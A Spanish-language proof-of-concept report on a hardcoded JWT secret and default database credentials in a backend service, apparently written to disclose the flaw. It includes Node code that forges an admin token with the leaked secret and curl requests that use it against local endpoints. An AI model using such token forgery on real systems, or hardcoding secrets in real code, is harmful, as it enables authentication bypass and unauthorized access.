# Prueba de Concepto - Credenciales Embebidas

## Vulnerabilidad encontrada
El secreto JWT está hardcodeado en el código fuente.

**Archivo vulnerable:** `services/backend/src/utils/jwt.ts:6`
```typescript
return jwt.sign(
  { id: userId }, 
  "secreto_super_seguro",  // <- Credencial hardcodeada
  { expiresIn: '1h' }
);
```

## Cómo explotar

### Paso 1: Leer el código fuente
El secreto JWT está visible en el código: `"secreto_super_seguro"`

### Paso 2: Generar tokens falsos
Con el secreto obtenido, un atacante puede generar tokens JWT válidos:

```javascript
const jwt = require('jsonwebtoken');

// Generar token falso con privilegios de admin
const fakeToken = jwt.sign(
  { id: '999', admin: true, role: 'admin' },
  "secreto_super_seguro",
  { expiresIn: '1h' }
);

console.log('Token falso:', fakeToken);
```

### Paso 3: Usar el token falso para acceder al sistema
```bash
curl -X GET "http://localhost:5000/invoices" \
  -H "Authorization: Bearer TOKEN_FALSO_AQUI"
```

### Paso 4: Verificar que el token es válido
```bash
curl -X GET "http://localhost:5000/auth/" \
  -H "Authorization: Bearer TOKEN_FALSO_AQUI"
```

## Otras credenciales encontradas
En `services/backend/src/knexfile.ts` hay credenciales por defecto inseguras:
- Usuario: `user` (si no se define DB_USER)
- Contraseña: `password` (si no se define DB_PASS)
- Base de datos: `jwt_api` (si no se define DB_NAME)

## Impacto
- Bypass completo de autenticación
- Acceso no autorizado a cualquier cuenta
- Escalación de privilegios
- Acceso a la base de datos con credenciales por defecto
